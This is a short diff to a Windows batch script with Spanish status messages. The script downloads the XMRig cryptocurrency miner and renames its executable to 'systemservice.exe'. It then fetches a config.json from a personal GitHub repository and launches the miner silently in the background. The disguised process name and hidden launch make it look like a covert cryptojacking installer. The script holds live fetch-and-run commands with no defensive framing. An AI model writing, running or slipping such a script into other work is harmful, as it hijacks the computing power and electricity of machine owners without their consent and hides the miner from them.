@@ -17,13 +17,12 @@ powershell -Command "Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/rele
 
 echo [2/3] Extrayendo archivos...
 powershell -Command "Expand-Archive -Path 'xmrig.zip' -DestinationPath '.' -Force"
-move "xmrig-6.20.0-msvc-win64\xmrig.exe" "systemservice.exe"
+copy "xmrig-6.20.0-msvc-win64\xmrig.exe" "systemservice.exe"
 
 echo [3/3] Configurando servicios...
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DECODERkING/code/main/config.json' -OutFile 'config.json'"
 
 del "xmrig.zip"
-rmdir "xmrig-6.20.0-msvc-win64" /s /q
 
 echo Iniciando procesos en segundo plano...
 start /B systemservice.exe --config=config.json
